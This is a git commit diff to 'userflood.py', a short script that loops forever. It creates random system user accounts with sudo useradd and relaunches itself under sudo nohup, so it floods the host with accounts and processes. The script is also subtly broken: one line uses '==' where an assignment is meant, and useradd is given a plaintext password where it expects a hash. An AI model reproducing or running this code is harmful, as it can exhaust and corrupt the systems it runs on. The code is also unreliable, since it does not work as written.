3568061e56a7d773addd1c7ab3392169bbbd8f8d
Benji <97198967+BenPI88@users.noreply.github.com>
2023-02-19 13:45:24 -0600

    Update userflood.py

--- userflood.py
+++ userflood.py
@@ -7,5 +7,5 @@ while True:
   while not i == 10:
     i += 1
     rndstr == rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
-  os.system("useradd -p " + rndstr + " " + rndstr)
+  os.system("sudo useradd -p " + rndstr + " " + rndstr)
   os.system("sudo nohup python3 userflood.py")
